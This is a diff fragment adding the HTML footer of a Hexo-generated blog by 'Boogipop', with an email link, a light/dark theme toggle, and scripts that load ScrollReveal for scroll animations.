+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2023 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
